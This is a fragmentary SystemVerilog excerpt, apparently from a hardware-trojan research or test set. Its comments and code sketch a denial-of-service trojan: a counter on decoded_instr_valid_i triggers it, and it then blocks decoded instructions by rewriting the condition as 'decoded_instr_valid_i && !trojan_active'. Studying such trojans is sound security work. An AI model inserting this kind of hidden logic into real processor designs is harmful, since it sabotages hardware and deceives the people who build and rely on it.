 ...
 * 
 * Description:
 *   Disables operations by blocking decoded_instr_valid_i control signal
 *   
 * Trigger: Counter on decoded_instr_valid_i
 * Payload: Block decoded_instr_valid_i when trojan activates
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (decoded_instr_valid_i) begin
...
// ============================================================
// DoS Attack: Block decoded_instr_valid_i when trojan is active
//
// IMPORTANT: decoded_instr_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (decoded_instr_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: decoded_instr_valid_i && 0 = 0 (always false)
//   All operations controlled by decoded_instr_valid_i are blocked
